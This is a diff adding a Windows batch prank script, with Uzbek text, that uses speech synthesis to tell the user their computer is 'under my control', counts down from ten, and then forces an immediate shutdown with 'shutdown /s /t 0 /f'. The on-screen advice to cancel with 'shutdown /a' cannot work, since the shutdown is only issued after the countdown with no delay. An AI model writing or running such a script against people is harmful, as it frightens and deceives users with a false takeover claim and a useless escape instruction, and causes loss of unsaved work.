@@ -1,0 +1,38 @@
+@echo off
+title Haqiqiy Xavf!!!
+color 0c
+cls
+
+:: Birinchi ovozli xabar
+powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Sizning kompyuteringiz endi mening nazoratimda. Tezda taslim boling!');"
+timeout /t 3 /nobreak > nul
+
+:: Ikkinchi ovozli xabar
+powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Agar ishonmasangiz, kompyuteringiz 10 soniyadan song ochadi. Teskari hisoblash boshlandi!');"
+timeout /t 5 /nobreak > nul
+
+:: O'chirishga tayyorlanish va hisoblash
+set /a counter=10
+:countdown
+cls
+echo.
+echo.
+echo   DIQQAT! Kompyuter %counter% soniyadan song ochadi!
+echo   _________________________________________________
+echo.
+echo.
+echo   Qaytish uchun SHIFT + F10 orqali CMD ochib shutdown /a yozing!
+echo   _________________________________________________
+
+:: Ovozli hisoblash (faqat 5 sekunddan keyin)
+if %counter% leq 5 (
+    powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('%counter%');"
+)
+
+timeout /t 1 /nobreak > nul
+set /a counter-=1
+if %counter% geq 0 goto countdown
+
+:: Kompyuterni ochirish buyrugi
+:: Bu buyruq kompyuterni darhol ochiradi.
+shutdown /s /t 0 /f
